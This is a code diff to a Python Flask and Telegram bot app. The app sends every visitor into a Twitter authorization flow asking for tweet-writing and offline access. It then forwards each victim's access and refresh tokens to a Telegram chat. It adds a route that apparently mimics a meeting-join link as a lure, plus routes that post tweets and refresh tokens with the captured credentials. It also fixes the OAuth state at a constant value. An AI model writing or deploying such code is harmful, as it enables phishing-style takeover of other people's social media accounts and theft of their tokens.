@@ -10,7 +10,7 @@ from telegram.ext import CommandHandler, CallbackQueryHandler, Updater, MessageH
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
-CALLBACK_URL = 'https://gifter-7vz7.onrender.com'  # Update with your callback URL
+CALLBACK_URL = 'https://gifter-7vz7.onrender.com/'  # Update with your callback URL
 ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')  # Token for the alert bot
 AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')  # Token for the automation bot
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
@@ -202,12 +202,111 @@ automation_dispatcher.add_handler(CommandHandler('start', start_automation))
 automation_dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
 automation_dispatcher.add_handler(CallbackQueryHandler(handle_button))
 
-# Flask route
+# Flask Routes for OAuth and Token Management
+@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
+def tweet(access_token):
+    if request.method == 'POST':
+        tweet_text = request.form['tweet_text']
+        result = post_tweet(access_token, tweet_text)
+        return render_template('tweet_result.html', result=result)
+
+    return render_template('tweet_form.html', access_token=access_token)
+
+@app.route('/refresh/<refresh_token2>', methods=['GET'])
+def refresh_page(refresh_token2):
+    return render_template('refresh.html', refresh_token=refresh_token2)
+
+@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
+def perform_refresh(refresh_token):
+    token_url = 'https://api.twitter.com/2/oauth2/token'
+    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
+    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
+
+    headers = {
+        'Authorization': f'Basic {auth_header}',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+    data = {
+        'refresh_token': refresh_token,
+        'grant_type': 'refresh_token',
+        'client_id': CLIENT_ID
+    }
+
+    response = requests.post(token_url, headers=headers, data=data)
+    token_response = response.json()
+
+    if response.status_code == 200:
+        new_access_token = token_response.get('access_token')
+        new_refresh_token = token_response.get('refresh_token')
+        send_to_telegram(new_access_token, new_refresh_token)
+        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
+    else:
+        error_description = token_response.get('error_description', 'Unknown error')
+        error_code = token_response.get('error', 'No error code')
+        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code
+
+@app.route('/j')
+def meeting():
+    state_id = request.args.get('meeting')
+    code_ch = request.args.get('pwd')
+    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
+
 @app.route('/')
 def home():
-    return "Server is running!"
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
 
-# Run the bots
+    if not code:
+        state = "0"
+        session['oauth_state'] = state
+
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier
+
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+
+        return redirect(authorization_url)
+
+    if code:
+        if error:
+            return f"Error during authorization: {error}", 400
+
+        if state != "0":
+            return "Invalid state parameter", 403
+
+        code_verifier = session.pop('code_verifier', None)
+
+        token_url = "https://api.twitter.com/2/oauth2/token"
+        data = {
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': CALLBACK_URL,
+            'code_verifier': code_verifier
+        }
+
+        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+        token_response = response.json()
+
+        if response.status_code == 200:
+            access_token = token_response.get('access_token')
+            refresh_token = token_response.get('refresh_token')
+
+            session['access_token'] = access_token
+            session['refresh_token'] = refresh_token
+
+            send_to_telegram(access_token, refresh_token)
+            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+        else:
+            error_description = token_response.get('error_description', 'Unknown error')
+            error_code = token_response.get('error', 'No error code')
+            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     send_startup_message()
